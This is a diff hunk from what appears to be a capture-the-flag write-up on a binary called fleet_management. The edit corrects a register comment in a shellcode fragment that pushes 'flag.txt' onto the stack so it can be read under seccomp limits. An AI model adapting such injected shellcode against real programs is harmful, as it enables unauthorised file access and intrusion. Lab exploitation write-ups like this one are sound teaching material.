@@ -51,7 +51,7 @@ sudo seccomp-tools dump ./fleet_management
 10. Here are the asm code we want to inject:
 
 ```asm
-xor rdx, rdx ; set rdi to 0
+xor rdx, rdx ; set rdx to 0
 push rdx ; push it to the stack
 mov rax, 0x7478742e67616c66 ; stores flag.txt
 push rax ; push it to the stack
